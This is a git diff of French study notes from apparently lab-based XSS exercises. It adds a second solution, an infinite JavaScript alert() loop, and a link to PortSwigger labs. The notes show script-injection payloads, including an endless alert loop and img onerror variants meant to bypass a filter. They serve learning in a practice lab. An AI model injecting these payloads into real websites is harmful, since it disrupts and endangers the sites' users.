@@ -61,6 +61,21 @@ while(true){
 <script>let msg = "vraiment ??";while(true){alert(msg);msg += " tu es sûr ??";}</script>
 ```
 
+correction 2
+
+``` js
+const tab = ["Voulez-vous fermer ?","Voulez-vous vraiment fermer ?","Non mais voulez-vous VRAIMENT fermer ?","Êtes-vous sûrs que vous voulez vraiment fermer ?","Êtes-vous VRAIMENT sûrs que vous voulez VRAIMENT fermer ?","J'arrête, j'espère que vous avez pas perdu la tête !"]
+        let i = 0;
+    while(true){
+        alert(tab[i%6]);
+        i++;
+    }
+    
+    
+    
+```
+
+
 ## XSS Reflected Medium
 
 - prendre le formulaire 
@@ -89,3 +104,8 @@ while(true){
 - tentative 6 : <IMG src="xxx" onerror="alert('virus')">
 - tentative 7 : <Img src="xxx" onerror="alert('virus')">
 - tentative 8 : <Img  onerror="alert('virus')" src="xxx" >
+
+
+<https://portswigger.net/web-security/all-labs>
+
+il faut se créer un compte utilisateur
